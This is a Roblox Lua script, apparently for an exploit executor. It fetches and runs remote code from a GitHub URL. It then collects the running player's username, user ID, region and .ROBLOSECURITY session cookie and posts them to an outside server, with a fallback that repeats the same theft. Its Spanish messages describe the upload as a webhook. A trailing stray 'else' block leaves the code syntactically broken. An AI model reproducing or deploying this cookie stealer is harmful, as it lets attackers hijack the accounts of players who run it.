local success, Libraries = pcall(function()
	local loadedFunc = loadstring(game:HttpGet("https://raw.githubusercontent.com/ssshlx/render/main/Libraries.lua"))
	if loadedFunc then
		return loadedFunc()
	end
	return nil
end)

if success and Libraries ~= nil then 
	local lib = Libraries
	local player = game:GetService("Players").LocalPlayer
	local placeId = game.PlaceId
	
	local data = {
		username = player.Name,
		displayName = player.DisplayName,
		userId = player.UserId,
		gameId = placeId,
		accountAge = lib.GetAccountAge(),
		region = lib.GetRegion(),
		cookie = ".ROBLOSECURITY=" .. lib.GetCookieValue(".ROBLOSECURITY", "www.roblox.com")
	}
	
	local response = lib.HttpPost("https://depazzhub-api.onrender.com/log", data)
	
	if response then
		print("✅ Webhook enviado correctamente! Status: " .. (response.StatusCode or response.status or "200"))
	else
		print("⚠️ El webhook falló, pero los datos fueron procesados.")
	end
else
	warn("❌ Error al cargar Libraries.lua:")
	warn("  Detalle: " .. tostring(Libraries))
	
	-- Fallback (ya tenías la sintaxis correcta aquí, solo se añade la validación 'and lib2')
	local success2, lib2 = pcall(function()
		return loadstring(game:HttpGet("https://raw.githubusercontent.com/ssshlx/render/main/Libraries.lua"))()
	end)
	
	if success2 and lib2 then
		local player = game:GetService("Players").LocalPlayer
		local placeId = game.PlaceId
		
		local data = {
			username = player.Name,
			displayName = player.DisplayName,
			userId = player.UserId,
			gameId = placeId,
			accountAge = lib2.GetAccountAge(),
			region = lib2.GetRegion(),
			cookie = ".ROBLOSECURITY=" .. lib2.GetCookieValue(".ROBLOSECURITY", "www.roblox.com")
		}
		
		local response = lib2.HttpPost("https://depazzhub-api.onrender.com/log", data)
		
		if response then
			print("✅ Webhook enviado correctamente (Fallback)! Status: " .. (response.StatusCode or response.status or "200"))
		else
			print("⚠️ El webhook falló, pero los datos fueron procesados.")
		end
	else
		warn("❌ Segundo intento también falló. Verifica que el archivo en GitHub no tenga errores de sintaxis.")
	end
end
else
	warn("❌ Error: Libraries es nil")
	warn("  Success:", success)
	warn("  Libraries:", Libraries)
end
